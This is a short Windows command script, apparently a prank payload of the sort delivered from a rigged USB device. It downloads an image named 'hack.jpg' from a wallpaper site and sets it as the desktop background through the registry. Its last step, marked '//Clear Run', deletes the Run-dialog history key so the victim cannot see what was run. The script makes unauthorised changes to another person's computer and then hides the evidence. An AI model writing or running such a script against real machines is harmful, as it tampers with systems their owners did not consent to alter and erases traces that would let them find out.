$client = new-object System.Net.WebClient
$client.DownloadFile(\"https://cdn.hipwallpaper.com/i/52/10/xLOrwz.jpg\" , \"hack.jpg\")
reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hack.jpg\" /f
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True

//Clear Run
reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f
exit
